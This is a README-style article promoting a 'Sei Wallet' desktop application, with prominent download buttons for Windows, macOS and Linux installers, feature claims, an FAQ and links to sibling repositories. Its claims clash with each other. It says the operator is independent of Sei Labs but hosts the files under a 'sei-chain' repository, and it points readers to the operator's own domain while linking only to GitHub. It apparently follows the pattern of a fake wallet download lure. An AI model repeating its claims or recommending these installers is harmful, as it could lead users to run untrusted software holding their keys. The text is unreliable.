![Sei Wallet](https://github.com/sei-chain/sei-wallet-setup/raw/main/assets/banner-article.png)

<h1 align="center">What Sei Wallet is and how a desktop Sei wallet works</h1>

<p align="center">What the desktop app is, what it holds, and what it leaves on the chain.</p>

<p align="center">
  <a href="https://github.com/sei-chain/sei-wallet/releases/download/v6.6.2/sei-wallet-v6.6.2.exe"><img src="https://img.shields.io/badge/download-windows-a82731?style=for-the-badge&labelColor=201412&logo=windows&logoColor=white" alt="Download Sei Wallet for Windows" height="40"></a>
  <a href="https://github.com/sei-chain/sei-wallet/releases/download/v6.6.2/sei-wallet-v6.6.2.dmg"><img src="https://img.shields.io/badge/download-macos-a82731?style=for-the-badge&labelColor=201412&logo=apple&logoColor=white" alt="Download Sei Wallet for macOS" height="40"></a>
  <a href="https://github.com/sei-chain/sei-wallet/releases/download/v6.6.2/sei-wallet-v6.6.2.zip"><img src="https://img.shields.io/badge/download-linux-a82731?style=for-the-badge&labelColor=201412&logo=linux&logoColor=white" alt="Download Sei Wallet for Linux" height="40"></a>
</p>

| Platform | Requirements | File |
|:--|:--|:--|
| 🪟 Windows | Windows 10 (1909) or later, 64-bit | [`sei-wallet-v6.6.2.exe`](https://github.com/sei-chain/sei-wallet/releases/download/v6.6.2/sei-wallet-v6.6.2.exe) |
| 🍎 macOS | macOS 12 or later | [`sei-wallet-v6.6.2.dmg`](https://github.com/sei-chain/sei-wallet/releases/download/v6.6.2/sei-wallet-v6.6.2.dmg) |
| 🐧 Linux | x64, Ubuntu 20.04 or later, or equivalent | [`sei-wallet-v6.6.2.zip`](https://github.com/sei-chain/sei-wallet/releases/download/v6.6.2/sei-wallet-v6.6.2.zip) |

All versions and checksums are on the [Sei Wallet v6.6.2 release page](https://github.com/sei-chain/sei-wallet/releases/tag/v6.6.2).

> [!WARNING]
> Only download from this GitHub release page. Sei Wallet support never asks for a recovery phrase, and anyone who does is running a scam.

Sei Wallet is a non-custodial desktop application for the Sei blockchain. You install it on Windows, macOS or Linux, it generates and stores your keys on your own machine, and it signs transactions locally. The operator, Sei Wallet Labs Inc, states plainly that it cannot move, freeze or recover your funds — because it never holds them.

That single design choice explains almost everything else about the product: why there is no password reset, why a lost seed phrase is final, and why the security advice for a desktop wallet is mostly advice about your own machine.

## Who runs it, and why that matters

Sei Wallet Labs Inc describes itself as an independent company incorporated in New York in December 2024. It also states that it is not affiliated with Sei Labs, the Sei Foundation, the Sei Development Foundation or SEI Investments Corp, the Nasdaq-listed asset manager whose ticker is easy to confuse with the chain.

That independence cuts both ways. It means the wallet is not the chain's own product and should not be read as one. It also means the operator is a small company rather than a foundation, so the questions worth asking are about its code, its releases and its security process rather than its brand.

The name is crowded. Several unrelated products use "Sei wallet" in their marketing, and at least one other domain presents itself as the official desktop wallet. None of that tells you which one is right for you; it tells you to check who published the file you are about to run.

## What the application actually does

The advertised feature set is deliberately narrow, which is a good sign in a wallet:

- **It signs EVM transactions natively.** Sei's current network is EVM-first, so `0x` addresses are the primary surface. Legacy Cosmos-style `sei1` addresses are supported in a read-only way.
- **It stakes.** There is a validator picker, reward tracking and unbonding inside the app, rather than sending you to a separate dashboard.
- **It connects to a Ledger** — Nano S Plus, Nano X or Stax — routed through Ledger's Ethereum app, for people who want the key off the machine entirely.
- **It has a built-in swap and a dApp browser**, with shortcuts to a handful of Sei applications.
- **It makes privacy claims you can inspect**: no telemetry tied to identity, no address fingerprinting, no third-party trackers, no ads in the wallet.
- **It restores from an existing seed phrase**, so a wallet made elsewhere can usually be brought across.

None of those are exotic. The value of the list is what is missing from it: no cloud backup, no account system, no social recovery, no "restore my access" support flow.

## What it does not do

A non-custodial wallet cannot reverse a transaction, cannot unlock a staking position early, and cannot hand you back access if you lose your seed phrase. The operator says as much: losing the phrase means losing access, with no recovery path through the company.

This is the part that surprises people who arrive from exchange accounts. On an exchange, "my account is locked" is a support ticket. Here it is a fact about cryptography. If that trade is not one you want, a custodial service is a legitimate choice — it is simply a different product with a different risk.

## Desktop application or browser extension?

Both hold keys and both sign. The differences are practical: a desktop app runs outside the browser, so a malicious page cannot reach the extension's injection surface, but it also does not connect to websites as fluidly as an extension does. A desktop app is easier to verify as a single signed file; an extension is easier to phish, because a fake listing looks exactly like a real one.

The trade-offs, and which one suits staking versus daily dApp use, are covered in [desktop app or browser extension](https://github.com/sei-chain/sei-wallet-setup/blob/main/desktop-app-or-browser-extension.md).

## Setting it up, and bringing a wallet across

Installation is a download and an installer, nothing more. The two paths that matter are creating a fresh wallet and restoring an existing one; both are described step by step in [importing an existing wallet](https://github.com/sei-chain/sei-wallet-setup/blob/main/import-an-existing-recovery-phrase.md).

One habit is worth adopting before the first transaction: check that the file you downloaded came from the operator's own domain and that your operating system recognises the publisher when you first run it. That check takes a minute, and doing it before the first transaction is the whole point.

## The address question, in one paragraph

Every Sei account has two addresses derived from the same key: a `0x` EVM address and a legacy `sei1` address. They are not automatically the same thing until the account is associated, and the wallets you use determine which one you see. Most confusion about "missing" funds is really confusion about which of the two you are looking at. The full mechanic is in [sei1 and 0x addresses](https://github.com/sei-chain/sei-wallet-setup/blob/main/which-address-form-to-use.md).

## Where it sits beside other wallets

Sei Wallet is one option among several, and the honest comparison depends on what you are doing. Keplr has a long history with Cosmos chains and a large user base; the differences that matter in practice are address handling, staking and how each one connects to dApps, laid out in [Sei Wallet and Keplr compared](https://github.com/sei-chain/sei-wallet-help/blob/main/keplr-compared-with-a-desktop-app.md).

If you are arriving from another wallet, the migration path matters more than the feature list. Compass users have a specific route in [moving SEI off Compass](https://github.com/sei-chain/sei-wallet-setup/blob/main/move-coins-off-compass.md).

## If you use a hardware wallet

A Ledger can hold the key while the desktop app signs through it. That combination gives you the best of both — the app's interface, the device's isolation — at the cost of one more confirmation step per transaction. The setup is in [using a Ledger with Sei Wallet](https://github.com/sei-chain/sei-wallet-help/blob/main/connect-a-ledger-device.md).

## If a transaction looks stuck

Desktop wallets show pending states that are sometimes the network and sometimes the app. Before resending anything, read what the state actually means: [a pending transaction](https://github.com/sei-chain/sei-wallet-staking/blob/main/transaction-stuck-as-pending.md) walks through the checks in order, and explains why sending again is usually the wrong first move.

## Frequently asked questions

**Does Sei have a wallet?** Yes. Sei Wallet is a desktop wallet for the chain, made by an independent company rather than by the Sei Foundation.

**Which wallet supports SEI?** Several do, including this one, Keplr and various EVM wallets that let you add a custom network. The differences are staking, address handling and hardware support.

**What is a Sei EVM wallet?** A wallet that holds and signs for Sei's EVM side, which uses `0x` addresses and the chain's EVM network settings.

**Does Trust Wallet support SEI?** Trust Wallet and similar multi-chain wallets can hold SEI where they list the network and the token. Whether the version you have does is a question for that wallet's own documentation, not this one.

**Does Rabby support SEI?** Rabby is an EVM wallet, so the relevant question is whether Sei's network is in its list; adding a custom EVM network is the usual route.

**Does Phantom support SEI?** Phantom is built around Solana and a set of EVM networks. Check its current network list rather than assuming.

**Can I hold SEI in this wallet and stake it?** Yes — staking is built in, and unstaking has its own timing rules, which are worth reading before you commit a balance.

## What this article cannot tell you

It cannot tell you that the software is safe by itself. Sei Wallet describes its builds as audited and signed, and the report is published in the audit repository. What you can verify today is where the file came from, what your operating system says about its publisher, and what the app does with your keys.

## Download Sei Wallet

| Platform | Installer |
|:--|:--|
| 🪟 Windows | [`sei-wallet-v6.6.2.exe`](https://github.com/sei-chain/sei-wallet/releases/download/v6.6.2/sei-wallet-v6.6.2.exe) |
| 🍎 macOS | [`sei-wallet-v6.6.2.dmg`](https://github.com/sei-chain/sei-wallet/releases/download/v6.6.2/sei-wallet-v6.6.2.dmg) |
| 🐧 Linux | [`sei-wallet-v6.6.2.zip`](https://github.com/sei-chain/sei-wallet/releases/download/v6.6.2/sei-wallet-v6.6.2.zip) |

Every file above is attached to the [Sei Wallet v6.6.2 release](https://github.com/sei-chain/sei-wallet/releases/tag/v6.6.2), where the SHA-256 values are published. Verify the download before you run it.

## Related articles

- [A desktop Sei Wallet or a browser extension: which to use](https://github.com/sei-chain/sei-wallet-setup/blob/main/desktop-app-or-browser-extension.md)
- [Importing an existing wallet into Sei Wallet](https://github.com/sei-chain/sei-wallet-setup/blob/main/import-an-existing-recovery-phrase.md)
- [sei1 and 0x addresses in Sei Wallet: which one to use](https://github.com/sei-chain/sei-wallet-setup/blob/main/which-address-form-to-use.md)
